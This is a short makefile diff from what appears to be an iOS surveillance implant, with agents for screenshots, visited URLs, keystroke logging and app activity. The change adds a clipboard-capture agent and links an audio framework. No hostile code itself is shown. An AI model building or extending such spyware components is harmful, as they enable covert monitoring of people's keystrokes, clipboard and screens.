@@ -20,10 +20,11 @@ INCLUDE   = -I../ -I../Modules/ -I../Support/ -I./ -I./Agents/
 CORE      = RCSILoader.mm
 MODULES   = #../Modules/RCSIEncryption.mm
 SUPPORT   = ../Support/RCSISharedMemory.m #ARMHooker.mm
-AGENTS    = Agents/RCSIAgentScreenshot.m Agents/RCSIAgentURL.m Agents/RCSIAgentInputLogger.mm Agents/RCSIAgentApplication.m
+AGENTS    = Agents/RCSIAgentScreenshot.m Agents/RCSIAgentURL.m Agents/RCSIAgentInputLogger.mm Agents/RCSIAgentApplication.m Agents/RCSIAgentPasteboard.m
 
 LDFLAGS=\
         -framework UIKit\
+        -framework AudioToolbox\
         -framework CoreFoundation\
         -framework Foundation\
         -framework CoreGraphics\
